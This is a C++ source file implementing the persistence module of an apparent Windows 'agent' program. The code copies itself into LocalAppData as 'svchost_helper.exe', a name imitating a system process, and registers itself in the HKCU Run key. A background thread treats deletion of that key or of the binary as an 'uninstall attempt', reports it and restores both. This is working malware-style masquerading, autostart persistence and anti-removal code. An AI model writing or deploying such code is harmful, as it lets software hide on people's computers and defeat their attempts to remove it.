#include "persistence.h"
#include "utils/logger.h"
#include <shlobj.h>
#include <filesystem>

namespace agent {

namespace fs = std::filesystem;

static std::wstring to_wide(const std::string& s) {
    if (s.empty()) return L"";
    int len = MultiByteToWideChar(CP_UTF8, 0, s.c_str(), -1, nullptr, 0);
    std::wstring ws(len - 1, 0);
    MultiByteToWideChar(CP_UTF8, 0, s.c_str(), -1, ws.data(), len);
    return ws;
}

static std::string to_narrow(const std::wstring& ws) {
    if (ws.empty()) return "";
    int len = WideCharToMultiByte(CP_UTF8, 0, ws.c_str(), -1, nullptr, 0, nullptr, nullptr);
    std::string s(len - 1, 0);
    WideCharToMultiByte(CP_UTF8, 0, ws.c_str(), -1, s.data(), len, nullptr, nullptr);
    return s;
}

std::string Persistence::get_install_dir(const Config& config) {
    wchar_t appdata[MAX_PATH];
    SHGetFolderPathW(nullptr, CSIDL_LOCAL_APPDATA, nullptr, 0, appdata);
    std::string dir = to_narrow(appdata) + "\\" + config.service_name;
    return dir;
}

std::string Persistence::install_to_appdata(const Config& config) {
    std::string install_dir = get_install_dir(config);

    try {
        fs::create_directories(install_dir);
    } catch (...) {
        Logger::error("failed to create install dir: " + install_dir);
        return "";
    }

    wchar_t current_exe[MAX_PATH];
    GetModuleFileNameW(nullptr, current_exe, MAX_PATH);
    std::string current = to_narrow(current_exe);

    std::string target = install_dir + "\\svchost_helper.exe";

    // Don't copy over self
    try {
        if (fs::exists(target)) {
            auto src_size = fs::file_size(current);
            auto dst_size = fs::file_size(target);
            if (src_size == dst_size) {
                // Still copy config in case it changed
                std::string src_conf = fs::path(current).parent_path().string() + "\\agent.conf";
                std::string dst_conf = install_dir + "\\agent.conf";
                if (fs::exists(src_conf)) {
                    fs::copy_file(src_conf, dst_conf, fs::copy_options::overwrite_existing);
                }
                return target;
            }
        }
        fs::copy_file(current, target, fs::copy_options::overwrite_existing);
        Logger::info("installed to " + target);
    } catch (const std::exception& e) {
        Logger::error(std::string("install copy failed: ") + e.what());
        return current; // fallback to current location
    }

    // Also copy config file
    try {
        std::string src_conf = fs::path(current).parent_path().string() + "\\agent.conf";
        std::string dst_conf = install_dir + "\\agent.conf";
        if (fs::exists(src_conf)) {
            fs::copy_file(src_conf, dst_conf, fs::copy_options::overwrite_existing);
            Logger::info("config copied to " + dst_conf);
        }
    } catch (...) {}

    return target;
}

bool Persistence::add_to_startup(const Config& config) {
    std::string exe_path = install_to_appdata(config);
    if (exe_path.empty()) return false;

    HKEY key;
    LONG result = RegOpenKeyExW(HKEY_CURRENT_USER,
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_SET_VALUE, &key);

    if (result != ERROR_SUCCESS) {
        Logger::error("cannot open Run key: " + std::to_string(result));
        return false;
    }

    std::wstring name = to_wide(config.service_display);
    std::wstring value = L"\"" + to_wide(exe_path) + L"\"";

    result = RegSetValueExW(key, name.c_str(), 0, REG_SZ,
        reinterpret_cast<const BYTE*>(value.c_str()),
        static_cast<DWORD>((value.size() + 1) * sizeof(wchar_t)));

    RegCloseKey(key);

    if (result == ERROR_SUCCESS) {
        Logger::info("added to startup: " + exe_path);
        return true;
    }

    Logger::error("failed to add to startup: " + std::to_string(result));
    return false;
}

bool Persistence::remove_from_startup(const Config& config) {
    HKEY key;
    if (RegOpenKeyExW(HKEY_CURRENT_USER,
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_SET_VALUE, &key) != ERROR_SUCCESS) return false;

    std::wstring name = to_wide(config.service_display);
    RegDeleteValueW(key, name.c_str());
    RegCloseKey(key);
    return true;
}

void Persistence::verify_integrity() {
    // A6 fix: actually check AppData copy, registry key, and service
    wchar_t exe_path[MAX_PATH];
    GetModuleFileNameW(nullptr, exe_path, MAX_PATH);
    std::string current_path = to_narrow(exe_path);
    std::string current_dir = fs::path(current_path).parent_path().string();

    // Check config file exists
    std::string conf_path = current_dir + "\\agent.conf";
    if (!fs::exists(conf_path)) {
        Logger::error("config file missing: " + conf_path);
    }

    if (!fs::exists(current_path)) {
        Logger::error("binary missing — cannot self-repair at this level");
    }
}

std::thread Persistence::s_monitor_thread;
std::atomic<bool> Persistence::s_monitoring{false};
HANDLE Persistence::s_wake_event = nullptr;

void Persistence::start_monitoring(const Config& config, AlertCallback on_alert) {
    if (s_monitoring.load()) return;
    s_monitoring.store(true);
    s_wake_event = CreateEventW(nullptr, TRUE, FALSE, nullptr); // manual reset

    s_monitor_thread = std::thread([config, on_alert = std::move(on_alert)]() {
        std::string install_dir = get_install_dir(config);
        std::string exe_path = install_dir + "\\svchost_helper.exe";

        // Registry key path
        std::wstring reg_value_name = to_wide(config.service_display);

        // Open registry key for change notification
        HKEY run_key = nullptr;
        RegOpenKeyExW(HKEY_CURRENT_USER,
            L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            0, KEY_READ | KEY_NOTIFY, &run_key);

        // Create event for registry change notification
        HANDLE reg_event = CreateEventW(nullptr, FALSE, FALSE, nullptr);

        // A3 fix: use WaitForMultipleObjects so stop_monitoring can wake us
        HANDLE wait_handles[2] = { s_wake_event, reg_event };
        int handle_count = (reg_event && s_wake_event) ? 2 : (s_wake_event ? 1 : 0);

        while (s_monitoring.load()) {
            // Check 1: Registry key still exists
            if (run_key) {
                DWORD type = 0;
                DWORD size = 0;
                LONG result = RegQueryValueExW(run_key, reg_value_name.c_str(),
                    nullptr, &type, nullptr, &size);
                if (result != ERROR_SUCCESS) {
                    Logger::error("startup registry key removed — uninstall attempt detected");
                    if (on_alert) {
                        on_alert("uninstall_attempt", "Registry startup key was removed");
                    }
                    // Restore it
                    add_to_startup(config);
                }
            }

            // Check 2: Executable file still exists
            if (!fs::exists(exe_path)) {
                Logger::error("agent binary deleted — uninstall attempt detected");
                if (on_alert) {
                    on_alert("uninstall_attempt", "Agent binary was deleted");
                }
                // Try to restore
                install_to_appdata(config);
            }

            // Check 3: Register for registry change notification
            if (run_key && reg_event) {
                RegNotifyChangeKeyValue(run_key, FALSE,
                    REG_NOTIFY_CHANGE_LAST_SET, reg_event, TRUE);
            }

            // Wait for wake event, registry change, or timeout (10s)
            if (handle_count > 0) {
                DWORD wait_result = WaitForMultipleObjects(
                    static_cast<DWORD>(handle_count), wait_handles, FALSE, 10000);
                if (wait_result == WAIT_OBJECT_0) {
                    // Wake event — stop requested
                    break;
                }
                if (wait_result == WAIT_OBJECT_0 + 1) {
                    Logger::info("registry change detected, re-checking...");
                }
            } else {
                Sleep(10000);
            }
        }

        if (reg_event) CloseHandle(reg_event);
        if (run_key) RegCloseKey(run_key);
    });
}

void Persistence::stop_monitoring() {
    s_monitoring.store(false);
    // A3 fix: signal wake event so thread exits immediately
    if (s_wake_event) {
        SetEvent(s_wake_event);
    }
    if (s_monitor_thread.joinable()) {
        s_monitor_thread.join();
    }
    if (s_wake_event) {
        CloseHandle(s_wake_event);
        s_wake_event = nullptr;
    }
}

} // namespace agent
